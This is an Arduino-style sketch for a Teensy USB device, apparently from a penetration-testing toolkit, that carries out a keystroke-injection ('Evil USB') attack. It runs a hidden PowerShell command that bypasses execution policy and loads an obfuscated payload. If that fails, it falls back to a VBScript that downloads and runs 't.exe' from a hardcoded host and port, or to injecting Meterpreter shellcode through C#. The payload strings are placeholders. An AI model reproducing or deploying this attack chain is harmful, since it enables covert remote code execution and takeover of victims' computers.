// This code is to set up the Evil USB attack on a Teensy 3.1 device.
// By Josh Hale "sn0wfa11"
// With use of the EvilUSB functions.

// Set the LED pin
const int led = 13; // Teensy 3.2 has LED on 13

// Powershell command to download, execute, and delete the payload script.  Encoded and compressed to try to hide ip and port information.
char command1[] = "powershell.exe -Nop -NonI -W Hidden -Exec Bypass -Command \"$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String('H4sI........"; // Put your PowerShell Script here. Make sure you escape any quotes \"

// Meterpreter Payload and .NET version - This is for the C# attack vector
char payload[] = "0xfc,0xe8,0x82,0x0,0x0,0x0,0x60........"; // Put your Hex Code here. Use the hex_generator MSF Module.
char net_ver[] = "4"; // This is the version of .NET to target

void setup() 
{
  // set stuff up
  pinMode(led, OUTPUT);
  bool connect_good = false;
  
  // Connect indicator and wait for drivers.
  led_blink(5,80);
  wait_for_drivers(2000, 5000);

  // Start the attack using powershell
  morse_code("go");
  run_and_hide(command1);
  
  if (numlock_success(75, 500)) // Check if powershell was successfull
  {
    connect_good = true;
    led_blink(3, 500);
  }

  if (!connect_good) // If not try vbscript instead
  {
    morse_code("go");
    vbscript_run_and_hide("http://192.168.1.101:12056/", "t.exe"); // Put in the IP or URL and port of the server hosting the payload.
    if (numlock_success(75, 500))
    {
      connect_good = true;
      led_blink(3, 500);
    }
  }

  if (!connect_good) // If still not, try a cs attack
  {
    morse_code("go");
    cs_run_and_hide(payload, net_ver);
    if (numlock_success(120, 500))
      led_blink(3,500);
  }
}

void loop() {}
